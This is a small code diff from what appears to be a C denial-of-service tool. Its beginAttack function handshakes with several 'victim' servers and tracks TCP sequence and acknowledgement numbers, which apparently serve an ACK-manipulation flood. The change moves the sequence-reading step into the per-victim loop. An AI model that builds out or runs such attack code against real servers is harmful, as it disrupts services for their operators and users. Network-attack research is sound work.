@@ -376,17 +376,18 @@ int beginAttack(int duration, double target_rate) {
     	}
 			m_victims[i]=m_victim;
 		}
-    
+
     // TODO FOR MULTI CONNECTION DO THE NEXT 3 LINES TOGETHER FOR EACH
     // VICTIM
     // Connect to each server using 3-way handshake
 		for(i=0; i<victims; i++){
     	handshake(&m_victim, sock);
+      // Get the start ack for each connection
+      unsigned read_seq = read_packet(&m_victim, sock);
+      m_victim.start_ack = m_victim.last_received_seq = m_victim.last_sent_ack = read_seq;
 		}
 
-    // Get the start ack for each connection
-    unsigned read_seq = read_packet(&m_victim, sock);
-    m_victim.start_ack = m_victim.last_received_seq = m_victim.last_sent_ack = read_seq;
+
 
     // Begin the pace thread to observe overruns
     // TODO
